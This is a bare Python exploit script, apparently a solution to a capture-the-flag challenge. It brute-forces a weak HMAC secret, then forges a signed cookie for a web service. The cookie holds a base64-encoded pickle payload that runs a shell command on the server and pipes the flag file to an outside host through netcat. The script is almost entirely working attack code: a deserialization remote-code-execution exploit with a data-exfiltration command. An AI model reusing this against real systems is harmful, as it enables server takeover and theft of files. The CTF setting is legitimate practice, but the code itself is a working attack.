import hmac
import hashlib
import httplib2
import urllib
import requests

def sha256_digest(data, secret):
	h = hmac.new("slashrootctf", data+secret, hashlib.sha256).hexdigest()
	# return sha256(data + secret).hexdigest()
	return h

def brute():
	for i in range(10):
		for j in range(10):
			for k in range(10):
				data = "Y3Bvc2l4CnN5c3RlbQpwMQooUydjYXQgL2ZsYWcudHh0IHwgbmMgY2N1Zy5ndW5hZGFybWEuYWMuaWQgNjY2NicKcDIKdFJwMwou"
				secret = "slashrootctf_" + str(i) + str(j) + str(k)
				cookie =  str(sha256_digest(data, secret)) + ":" + data
				http = httplib2.Http()
				# get cookie_value here
				headers = {'data':cookie}
				r = requests.get('http://192.168.2.20:60202/', cookies=headers)
				print r.content

brute()
